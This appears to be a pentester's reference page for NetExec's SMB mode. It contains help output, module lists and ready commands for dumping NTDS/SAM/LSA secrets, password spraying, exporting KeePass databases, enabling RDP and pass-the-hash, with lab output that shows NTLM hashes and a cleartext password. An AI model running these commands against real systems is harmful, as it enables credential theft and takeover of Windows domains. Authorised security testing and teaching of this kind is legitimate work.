---
title : "SMB"
# pre : ' '
description : "Own stuff using SMB."
date : 2023-10-05T12:25:10+02:00
# hidden : true
# draft : true
weight : 0
tags : ['Framework', 'SMB']
---

## NetExec - SMB

## Installation

Install [NetExec]({{< ref "../netexec" >}}).

## Usage

```plain
netexec smb [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]]
                   [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding] [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
                   [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--server {http,https}] [--server-host HOST] [--server-port PORT] [--connectback-host CHOST] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options]
                   [-H HASH [HASH ...]] [--delegate DELEGATE] [--self] [-d DOMAIN | --local-auth] [--port PORT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT]
                   [--laps [LAPS]] [--sam] [--lsa] [--ntds [{vss,drsuapi}]] [--dpapi [{cookies,nosystem} ...]] [--sccm [{disk,wmi}]] [--mkfile MKFILE] [--pvk PVK] [--enabled] [--user USERNTDS] [--shares] [--interfaces]
                   [--no-write-check] [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--sessions] [--disks] [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER ...]] [--groups [GROUP]]
                   [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                   [--depth DEPTH] [--only-files] [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--put-file FILE FILE] [--get-file FILE FILE] [--append-host] [--exec-method {smbexec,wmiexec,mmcexec,atexec}]
                   [--dcom-timeout DCOM_TIMEOUT] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts] [--force-ps32] [--no-encode]
                   target [target ...]
```

## Flags

```plain
positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

options:
  -h, --help            show this help message and exit
  -H HASH [HASH ...], --hash HASH [HASH ...]
                        NTLM hash(es) or file(s) containing NTLM hashes
  --delegate DELEGATE   Impersonate user with S4U2Self + S4U2Proxy
  --self                Only do S4U2Self, no S4U2Proxy (use with delegate)
  -d DOMAIN, --domain DOMAIN
                        domain to authenticate to
  --local-auth          authenticate locally to each target
  --port PORT           SMB port (default: 445)
  --share SHARE         specify a share (default: C$)
  --smb-server-port SMB_SERVER_PORT
                        specify a server port for SMB (default: 445)
  --gen-relay-list OUTPUT_FILE
                        outputs all hosts that don't require SMB signing to the specified file
  --smb-timeout SMB_TIMEOUT
                        SMB connection timeout (default: 2)
  --laps [LAPS]         LAPS authentification

Generic:
  Generic options for nxc across protocols

  -t THREADS, --threads THREADS
                        set how many concurrent threads to use (default: 256)
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  Options to set verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds (default: 3)

Authentication:
  Options for authenticating

  -u USERNAME [USERNAME ...], --username USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...], --password PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2)
  --continue-on-success
                        continues authentication attempts even after successes
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host

Kerberos:
  Options for Kerberos authentication

  -k, --kerberos        Use Kerberos authentication
  --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
  --aesKey AESKEY [AESKEY ...]
                        AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

Servers:
  Options for nxc servers

  --server {http,https}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  --connectback-host CHOST
                        IP for the remote system to connect back to

Modules:
  Options for nxc modules

  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules
  --options             display module options

Credential Gathering:
  Options for gathering credentials

  --sam                 dump SAM hashes from target systems
  --lsa                 dump LSA secrets from target systems
  --ntds [{vss,drsuapi}]
                        dump the NTDS.dit from target DCs using the specifed method
  --dpapi [{cookies,nosystem} ...]
                        dump DPAPI secrets from target systems, can dump cookies if you add 'cookies', will not dump SYSTEM dpapi if you add nosystem
  --sccm [{disk,wmi}]   dump SCCM secrets from target systems
  --mkfile MKFILE       DPAPI option. File with masterkeys in form of {GUID}:SHA1
  --pvk PVK             DPAPI option. File with domain backupkey
  --enabled             Only dump enabled targets from DC
  --user USERNTDS       Dump selected user from DC

Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              enumerate shares and access
  --interfaces          enumerate network interfaces
  --no-write-check      Skip write check on shares (avoid leaving traces when missing delete permissions)
  --filter-shares FILTER_SHARES [FILTER_SHARES ...]
                        Filter share by access, option 'read' 'write' or 'read,write'
  --sessions            enumerate active sessions
  --disks               enumerate disks
  --loggedon-users-filter LOGGEDON_USERS_FILTER
                        only search for specific user, works with regex
  --loggedon-users      enumerate logged on users
  --users [USER ...]    enumerate domain users, if a user is specified than only its information is queried.
  --groups [GROUP]      enumerate domain groups, if a group is specified than its members are enumerated
  --computers [COMPUTER]
                        enumerate computer users
  --local-groups [GROUP]
                        enumerate local groups, if a group is specified then its members are enumerated
  --pass-pol            dump password policy
  --rid-brute [MAX_RID]
                        enumerate users by bruteforcing RIDs

WMI:
  Options for WMI Queries

  --wmi QUERY           issues the specified WMI query
  --wmi-namespace NAMESPACE
                        WMI Namespace (default: root\cimv2)

Spidering:
  Options for spidering shares

  --spider SHARE        share to spider
  --spider-folder FOLDER
                        folder to spider (default: .)
  --content             enable file content searching
  --exclude-dirs DIR_LIST
                        directories to exclude from spidering
  --depth DEPTH         max spider recursion depth
  --only-files          only spider files
  --pattern PATTERN [PATTERN ...]
                        pattern(s) to search for in folders, filenames and file content
  --regex REGEX [REGEX ...]
                        regex(s) to search for in folders, filenames and file content

Files:
  Options for remote file interaction

  --put-file FILE FILE  Put a local file into remote target, ex: whoami.txt \\Windows\\Temp\\whoami.txt
  --get-file FILE FILE  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
  --append-host         append the host to the get-file filename

Command Execution:
  Options for executing commands

  --exec-method {smbexec,wmiexec,mmcexec,atexec}
                        method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
  --dcom-timeout DCOM_TIMEOUT
                        DCOM connection timeout (default: 5)
  --get-output-tries GET_OUTPUT_TRIES
                        Number of times atexec/smbexec/mmcexec tries to get results (default: 10)
  --codec CODEC         Set encoding used (codec) from the target's output. If errors are detected, run chcp.com at the target & map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute
                        again with --codec and the corresponding codec (default: utf-8)
  --no-output           do not retrieve command output
  -x COMMAND            execute the specified CMD command
  -X PS_COMMAND         execute the specified PowerShell command

Powershell Obfuscation:
  Options for PowerShell script obfuscation

  --obfs                Obfuscate PowerShell scripts
  --amsi-bypass FILE    File with a custom AMSI bypass
  --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
  --force-ps32          force PowerShell commands to run in a 32-bit process (may not apply to modules)
  --no-encode           Do not encode the PowerShell command ran on target
```

### Modules

#### LOW PRIVILEGE MODULES

```plain
[*] add-computer              Adds or deletes a domain computer
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] enum_av                   Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)
[*] enum_ca                   Anonymously uses RPC endpoints to hunt for ADCS CAs
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] ioxidresolver             This module helps you to identify hosts that have additional active interfaces
[*] ms17-010                  MS17-010 - EternalBlue - NOT TESTED OUTSIDE LAB ENVIRONMENT
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] printerbug                Module to check if the Target is vulnerable to PrinterBug. Set LISTENER IP for coercion.
[*] printnightmare            Check if host vulnerable to printnightmare
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky                    Creates windows shortcuts with the icon attribute containing a URI to the specified  server (default SMB) in all shares with write permissions
[*] spider_plus               List files recursively and save a JSON share-file metadata to the 'OUTPUT_FOLDER'. See module options for finer configuration.
[*] spooler                   Detect if print spooler is enabled or not
[*] webdav                    Checks whether the WebClient service is running on the target
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
```

#### HIGH PRIVILEGE MODULES (requires admin privs)

```plain
[*] bitlocker                 Enumerating BitLocker Status on target(s) If it is enabled or disabled.
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] firefox                   Dump credentials from Firefox
[*] get_netconnections        Uses WMI to query network connections.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
[*] iis                       Checks for credentials in IIS Application Pool configuration files using appcmd.exe
[*] impersonate               List and impersonate tokens to run command as locally logged on users
[*] install_elevated          Checks for AlwaysInstallElevated
[*] keepass_discover          Search for KeePass-related files and process.
[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mobaxterm                 Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export
[*] mremoteng                 Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them) 
[*] msol                      Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] ntdsutil                  Dump NTDS with ntdsutil
[*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to lower than 3 (which means ntlmv1 is enabled)
[*] pi                        Run command as logged on users via Process Injection
[*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
[*] putty                     Query the registry for users who saved ssh private keys in PuTTY. Download the private keys if found.
[*] rdcman                    Remotely dump Remote Desktop Connection Manager (sysinternals) credentials
[*] rdp                       Enables/Disables RDP
[*] reg-query                 Performs a registry query on the machine
[*] reg-winlogon              Collect autologon credential stored in the registry
[*] runasppl                  Check if the registry value RunAsPPL is set or not
[*] schtask_as                Remotely execute a scheduled task as a logged on user
[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
[*] test_connection           Pings a host
[*] uac                       Checks UAC status
[*] veeam                     Extracts credentials from local Veeam SQL Database
[*] vnc                       Loot Passwords from VNC server and client configurations
[*] wcc                       Check various security configuration items on Windows machines
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] wifi                      Get key of all wireless interfaces
[*] winscp                    Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.
```

## Commands to Have on Hand

For local authentication, add the `--local-auth` flag to the command.

### NTDS/SAM/LSA

#### Complete Dump

```plain
nxc smb <target> -u <user> -p <password> --ntds
```

#### Dump Specific User

```plain
nxc smb <target> -u <user> -p <password> --ntds --user <username-to-dump>
```

#### Dump SAM

```plain
nxc smb <target> -u <user> -p <password> --sam
```

#### Dump LSA

```plain
nxc smb <target> -u <user> -p <password> --lsa
```

### Domain Password Spray

To find valid usernames to spray, have a look at [Kerbrute]({{< ref "kerbrute" >}}).

By default NXC will stop when a valid login combination is found. If you want NXC to proceed with the whole list you're trying, use the `--continue-on-success` flag.

```plain
nxc smb <dc-ip> -u <user.txt> -p <password.txt>
```

### Dump KeePass

```plain
nxc smb <target> -u <user-or-admin> -p <password> -M keepass_discover
```

```plain
nxc smb <target> -u <user-or-admin> -p <password> -M keepass_trigger -o KEEPASS_CONFIG_PATH="C:\Users\crypt0rr\AppData\Roaming\KeePass\KeePass.config.xml" ACTION=ALL
```

### Check Password Policy

```plain
nxc smb <dc-ip> -u <user> -p <password> --pass-pol
```

### Enable/disable RDP

ACTION can be set to `enable` or `disable`.

```plain
nxc smb <target> -u <user> -p <password> -M rdp -o ACTION='enable'
```

### Enumerate shares

```plain
nxc smb <target> -u <user> -p <password> --shares
```

## Practical Examples

### Checking Targets

```plain
$ nxc smb targets                                                                                              
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### Generate Targets List Where Signing is Not Required

```plain
$ nxc smb targets --gen-relay-list myrelaylist
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

$ cat myrelaylist                                                                                              
100.97.176.89
100.88.252.136
```

### Check Targets for Ability to Log In, and Check Local Admin

When '(Pwn3d!)' is shown, the user is 'local admin' on the target machine.

```plain
$ nxc smb targets -u crypt0rr -p Welkom1234
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [+] offsec.nl\crypt0rr:Welkom1234 
SMB         100.108.80.137  445    DC02             [+] offsec.nl\crypt0rr:Welkom1234 
SMB         100.88.252.136  445    CL02             [+] offsec.nl\crypt0rr:Welkom1234 (Pwn3d!)
SMB         100.97.176.89   445    CL01             [+] offsec.nl\crypt0rr:Welkom1234 
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### Dump NTDS (remote)

```plain
$ nxc smb 100.120.137.43 -u administrator -p Welkom1234 --ntds            
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [+] offsec.nl\administrator:Welkom1234 (Pwn3d!)
SMB         100.120.137.43  445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         100.120.137.43  445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
SMB         100.120.137.43  445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         100.120.137.43  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fcf361727013e98e5801e3f77e26ca42:::
SMB         100.120.137.43  445    DC01             offsec.nl\JANETTE_FRANCIS:1104:aad3b435b51404eeaad3b435b51404ee:c25a38cdb481cc04df93174da705e4c3:::
SMB         100.120.137.43  445    DC01             offsec.nl\JEFFEREY_MCBRIDE:1105:aad3b435b51404eeaad3b435b51404ee:49313f0112933faba1eb330ba6cf264c:::
SMB         100.120.137.43  445    DC01             offsec.nl\ROBBY_POTTER:1106:aad3b435b51404eeaad3b435b51404ee:7ef9cac31ce263d3e331366999981d47:::
SMB         100.120.137.43  445    DC01             offsec.nl\DORTHY_KERR:1107:aad3b435b51404eeaad3b435b51404ee:84f41fe1b396502031bc214faa95d04e:::
```

### Pass-the-Hash

```plain
$ nxc smb targets -u administrator -H 97f2592347d8fbe42be381726ff9ea83             
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.108.80.137  445    DC02             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         100.97.176.89   445    CL01             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         100.88.252.136  445    CL02             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         100.120.137.43  445    DC01             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
```

### Remote User Account Control (UAC)

If you know the user has local administrator rights but you get the error `STATUS_LOGON_TYPE_NOT_GRANTED` or the authentication works but not `Pwn3d!`, Remote User Account Control is likely to be enabled.

Have a look at [Regedit - Disabled Remote UAC]({{< ref "regedit#disable-remote-user-account-control-uac" >}})

```plain
$ nxc smb 100.97.176.89 -u crypt0rr -p Welkom1234  --local-auth
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.97.176.89   445    CL01             [-] offsec.nl\crypt0rr:Welkom1234 STATUS_LOGON_TYPE_NOT_GRANTED
```
